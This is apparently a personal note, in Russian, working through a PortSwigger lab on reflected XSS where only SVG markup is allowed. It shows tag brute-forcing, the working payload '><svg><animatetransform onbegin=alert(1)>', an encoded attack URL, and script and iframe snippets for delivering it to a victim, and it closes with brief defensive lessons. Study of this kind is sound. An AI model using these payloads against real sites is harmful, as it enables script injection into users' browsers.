лаба https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
#### Reflected XSS with some SVG markup allowed
задание 
нужно вызвать аллерт
при этом обычные теги вроде блокируются - кроме тегов svg

-----
есть поиск по сайту
вбитые в поиск 66666 отражаются сервером в ответе в html
```html
  <h1>0 search results for '66666'</h1>
```

число запросов к сайту не ограничивается!

могу бутфорсить теги
пейлоад тегов возьму из лабы [[lab_02_Reflected_XSS]]  там же есть скрипт

результаты тестирования на запрещенные теги:
< title>
< animatetransform> 
< image>
< svg>

отлично, есть пара svg тегов которые не блокирует waf
еще более классная новость, что тег svg не блокируется, так он является обязательный контекстом для работы тегов типа svg!

пример
`   >< animatetransform onbegin=print(1)>   `

```html
пейлоад
 ><svg><animatetransform onbegin=print(1)>  
         или 
'><svg><animatetransform onbegin=print(1)> 

ответ

 <h1>0 search results for '><svg><animatetransform onbegin=print(1)>'</h1>
                       
                       или
                       
<h1>0 search results for ''><svg><animatetransform onbegin=print(1)>'</h1>
                  
   принты вывелись! отлично ! в обоих случаях!
   значит удалось добиться выполнению кода!
   
   ><svg><animatetransform onbegin=alert(1)>  алерт тоже выводится
   
```

создал url ссылку запроса с таким пейлоадом на алерт
`https://0a1c00ce04c9f093800c1701007d0054.h1-web-security-academy.net/?search=%3E%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29%3E`

теперь нужно чтобы жертва перешла по этой ссылке, можно сделать через iframe или через script

```
<script>location='https://0a1c00ce04c9f093800c1701007d0054.h1-web-security-academy.net/?search=%3E%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29%3E'</script>


<iframe src="https://0a1c00ce04c9f093800c1701007d0054.h1-web-security-academy.net/?search=%3E%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29%3E" onload="this.style.width='100px'"></iframe>
```

теперь когда жертва перейдет на мой сайт - ты выполнится один из данных скриптов - и в браузере жертвы откроется алерт мой.

----
 
в лабе сказано что нужно вызвать аллерт alert()
я вызвал, я перешел и через ссылку и открылся аллерт
но лаба не решилась почему то 
эксплойт сервера тут нет...

короче иду в офиц решение - так как  эксплойт сервера нет, а аллерт я и так вызвал уже!



вот офиц решение
https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E

вот мое решние
https://0a1c00ce04c9f093800c1701007d0054.h1-web-security-academy.net/?search=%3E%3Csvg%3E%3Canimatetransform+onbegin%3Dalert%281%29%3E


```
вот офиц решение

https://YOUR-LAB-ID.web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>

вот мое решние

https://0a1c00ce04c9f093800c1701007d0054.h1-web-security-academy.net/?search=><svg><animatetransform onbegin=alert(1)>

https://0a1c00ce04c9f093800c1701007d0054.h1-web-security-academy.net/?search="><svg><animatetransform onbegin=alert(1)>


вот всех случаях алерт вызывается - но лаба не решена!
пейлоады один в один одинаковые!
```
хз че хотят от меня, посмотрю видео решение.

разобрался
я выводил alert(1) или alert()
а лаба принимала только alert("1") текст в алерте
лаба решена; это, можно сказать, почти баг в лабе.
в задании сказали сделать alert() а нужно alert("текст")

-------

#### вывод

waf не блокировал теги svg 
соответвенно можно было использовать атрибуты для svg
и теги и арибуты я проверил через интрудер турбо и нашел те что не блок

создал простой пейлоад
`><svg><animatetransform onbegin=alert(1)>` который сразу и сработал

лаба решена!


#### защита!

валидация ввода - было разрешено вводить и символы и теги и атрибуты..

число попыток не ограничивалось ваще нифиг.. хоть 10 млн попыток взлома - пофигу все равно





